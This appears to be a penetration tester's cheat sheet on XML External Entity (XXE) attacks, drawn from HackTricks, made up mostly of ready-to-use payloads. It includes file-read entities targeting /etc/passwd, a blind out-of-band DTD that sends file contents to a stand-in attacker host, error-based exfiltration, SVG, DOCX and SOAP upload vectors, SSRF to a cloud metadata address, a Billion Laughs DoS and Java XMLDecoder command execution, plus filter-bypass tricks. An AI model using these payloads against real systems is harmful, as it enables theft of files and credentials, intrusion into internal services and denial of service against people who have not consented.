# Moraa — XXE (XML External Entity → file read / SSRF / RCE)

> HackTricks `xxe-xee-xml-external-entity`. Cross-ref [[ssrf]] (OOB exfil = SSRF primitive),
> [[file-upload]] (SVG/DOCX/XLSX vector), [[lfi]] (php:// wrappers).

## Find the input — XML isn't always where you expect
Obvious: SOAP/XML-RPC APIs, `Content-Type: application/xml`. Non-obvious: **file uploads that are
secretly XML containers** — SVG (image upload), DOCX/XLSX/PPTX (zip of XML), PDF forms. Also try
converting a JSON/form request: change `Content-Type: application/x-www-form-urlencoded` → `text/xml`
and send an XML body instead — some frameworks auto-parse by header alone.

## 1. Basic in-band file read (try this first)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```
If the read file has newlines and the response context can't render them, wrap in a PHP filter (only
if PHP-based):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>
```

## 2. Blind XXE — out-of-band exfil (when no reflection in response)
Host `evil.dtd` on your server:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://COLLABORATOR/?x=%file;'>">
%eval; %exfil;
```
Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>
<foo>bar</foo>
```
Confirm first with just `<!ENTITY % xxe SYSTEM "http://COLLABORATOR/probe">%xxe;` — a hit proves
OOB fetch works before you build the exfil chain.

## 3. Error-based exfil (egress blocked — no outbound network needed)
```xml
<!-- error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval; %error;
```
The parser tries to open a path containing the file's own content → the "file not found" error
message reflects it. **No local DTD available / fully offline target:** repurpose an existing local
DTD (e.g. `file:///usr/share/yelp/dtd/docbookx.dtd`) to redefine one of its entities with the same
trick — works even with zero outbound connectivity.

## 4. Upload-vector payloads
**SVG (uploaded as an "image"):**
```xml
<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="file:///etc/hostname"/></svg>
```
**DOCX/XLSX/PPTX:** unzip, inject the entity block into `word/document.xml` / `xl/sharedStrings.xml` /
`[Content_Types].xml`, rezip, upload.
**SOAP:**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE d [<!ENTITY % dtd SYSTEM "http://attacker/">%dtd;]><x/>]]></foo></soap:Body>
```

## 5. Escalate beyond file read
- **SSRF:** `SYSTEM "http://internal-service/"` or metadata `http://169.254.169.254/...` — treat as
  the SSRF primitive it is ([[ssrf]]).
- **Billion Laughs (DoS):** nested entity expansion (`&a9;` referencing 10 copies of `&a8;`, ×9 deep)
  exhausts memory — use sparingly, only with authorization for DoS testing.
- **Java `XMLDecoder` RCE (different bug, same family):** if the app deserializes XML via
  `java.beans.XMLDecoder`, a `<java><object class="java.lang.ProcessBuilder">...</object></java>`
  payload executes commands directly — this is RCE, not just entity expansion.

## WAF / filter bypass
- Numeric HTML-entity-encode the DOCTYPE keywords.
- `data://text/plain;base64,<b64-of-payload>` in place of a blocked `file://`.
- UTF-7 re-encode the whole payload + declare `<?xml version="1.0" encoding="UTF-7"?>`.
- Parameter entities (`%xxe;`) when general entities (`&xxe;`) are stripped by a naive filter.

## Confirm & report
File read: show the actual file contents in the response/OOB callback. Blind: show the collaborator
hit correlated to the specific payload. State whether it's file-read-only (High — config/creds/SSH
keys) or chains to SSRF/RCE (Critical). Tools: `DTD Finder`, `XXEinjector`, Burp collaborator.
